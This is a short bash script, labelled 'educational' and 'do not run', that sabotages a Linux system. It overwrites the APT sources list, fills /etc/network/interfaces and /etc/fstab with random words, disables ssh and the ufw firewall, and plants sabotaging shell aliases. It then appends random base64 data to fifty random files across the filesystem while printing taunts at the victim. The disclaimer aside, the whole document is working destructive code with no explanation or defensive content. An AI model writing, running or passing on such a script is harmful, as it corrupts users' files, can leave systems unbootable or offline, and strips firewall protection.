#!/bin/bash

# PLEASE DO NOT RUN THIS SCRIPT
# This will destroy files at random
# Only for educational purposes

echo "Starting the destruction"
echo "let me say this already"
sleep 4
echo "you're a dumbass"
sleep 1

# package management randomness
echo "messing up your precious APT >:D"
echo "deb http://invalid.repo.url/ubuntu/ bionic main" > /etc/apt/sources.list

# Disable networking

echo "cutting the internet from you!"
mv /etc/network/interfaces /etc/network/interfaces.bak
shuf -n 200 /usr/share/dict/words > /etc/network/interfaces
shuf -n 300 /usr/share/dict/words >> /etc/network/interfaces

# filling up some config idk
shuf -n 3000 /usr/share/dict/words >> /etc/fstab

# service disabling!!!
echo "Cleaning up unnesecary services! <:D"
systemctl disable ssh
systemctl disable ufw
systemctl disable x11-common

# messing up your bashrc! >:D
echo "alias ls='echo nothing' " >> ~/.bashrc
echo "alias cd='find / -type f' " >> ~/.bashrc

# random dumping of data!!!

find / -type f 2>/dev/null | shuf -n 50 | while read -r file; do
	echo "writing to $file"
	head -c 2000 /dev/urandom | base64 >> "$file"
done

echo "destruction complete! Your system is now less usable, maybe even broken!"
echo "Good luck restoring this hunk of garbage, best if ya just...leave."

